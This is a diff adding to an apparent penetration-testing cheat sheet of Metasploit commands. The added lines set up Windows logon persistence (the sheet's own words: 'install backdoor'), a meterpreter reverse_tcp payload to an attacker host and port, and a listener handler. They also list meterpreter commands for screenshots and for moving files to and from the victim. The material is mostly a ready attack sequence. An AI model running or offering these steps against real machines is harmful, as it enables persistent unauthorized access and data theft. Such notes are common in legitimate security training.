@@ -138,11 +138,53 @@ __Unshadow__
 
 __[s4u_persistence]                             |  install backdoor on meterpreter session using__ 
 
-- use exploit/windows/local/s4u_persistence     |  module 
+> - use exploit/windows/local/s4u_persistence     |  module 
 
-- show options                                  |  show options that come with the module 
+> - show options                                  |  show options that come with the module 
 
-- set trigger logon                             |  sets up the module to start when the usre logson 
+> - set trigger logon                             |  sets up the module to start when the usre logson 
 
 
-- 
+>  - set payload/windows/meterpreter/reverse_tcp  | generated the payload type reverse shell 
+
+
+> - set LHOST hostIP			          | add host IP
+
+
+> - set LPORT hostPORT 				  | add host port 
+
+> - exploit 
+
+
+
+__Set up a listener handler__
+
+
+> - use exploit/multi/handler    		 | setting up listener handler
+
+
+> - set payload/meterpreter/revserse_tcp   | setting up meterpreter
+
+
+> - set LHOST				 | host IP
+
+
+> - set LPORT 				 | host Port 
+	
+
+> - show options 				 | show the options that comes with a module 
+
+
+> - exploit 
+
+
+__Meterpreter Commands:___
+
+
+> - screenshot                           | for desktop screenshot
+
+> - download filePath 			 | download files from the other machine 
+
+>- upload filePath 			 | upload files to the other machine 
+
+> - help 				 | to show all the meterpreter commands 
